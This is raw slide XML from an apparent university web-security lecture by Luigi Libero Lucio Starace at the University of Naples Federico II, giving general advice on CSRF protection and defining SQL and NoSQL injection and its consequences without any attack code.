              <a:rPr dirty="0" sz="2400" spc="-7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u="sng" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>protects</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400" spc="-60">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>POST</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400" spc="-55">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>methods</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400" spc="-55">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>by</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400" spc="-65">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>default</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="006379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with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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 spc="-30">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>token-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based</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>mechanism</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="313690" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1030"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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If</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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protection</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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capabilities</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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are</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10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available,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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you</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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should</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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read</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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documentation</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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make</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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sure</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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you</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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use</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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them</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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correctly!</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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If</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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not,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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you</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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should</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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still</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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implement</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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protection</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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your</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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own</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>for </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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sensitive</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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operations!</a:t>
            </a:r>
            <a:endParaRPr sz="2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397755" y="22858"/>
            <a:ext cx="5794243" cy="6835139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962050" y="3005708"/>
            <a:ext cx="5126355" cy="75692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4800"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-10"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-105"/>
              <a:t>INJECTIONS</a:t>
            </a:r>
            <a:endParaRPr sz="4800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="object 4" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4117975" y="6335674"/>
            <a:ext cx="3897629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solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-40">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Federico </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="5">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-5">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Security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11049761" y="6427114"/>
            <a:ext cx="18097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25">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>31</a:t>
            </a:r>
            <a:endParaRPr sz="1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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>32</a:t>
            </a:fld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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-15"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t>INJECTIONS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962050" y="1533220"/>
            <a:ext cx="10206355" cy="301180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240029" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3195"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="95"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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Injections</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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consist</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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injecting</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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code</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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coming</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>from</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="241300">
              <a:lnSpc>
                <a:spcPts val="3195"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>unsanitized</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-95" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>user</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-90" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>inputs</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-95" b="1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into</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10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database</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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queries</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1060"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Don’t</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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get</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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fooled</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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by</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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name:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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NoSQL</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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database</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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queries</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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just</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>as </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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vulnerable</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="31115" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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These</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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result</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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leaking</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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private</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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data,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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modifying</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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(create,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	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update,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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delete)</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10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database</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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data,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10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access</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10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control</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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violations,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>some </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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cases</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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even</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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arbitrary</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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code</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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execution</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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database</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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server.</a:t>
            </a:r>
            <a:endParaRPr sz="2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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
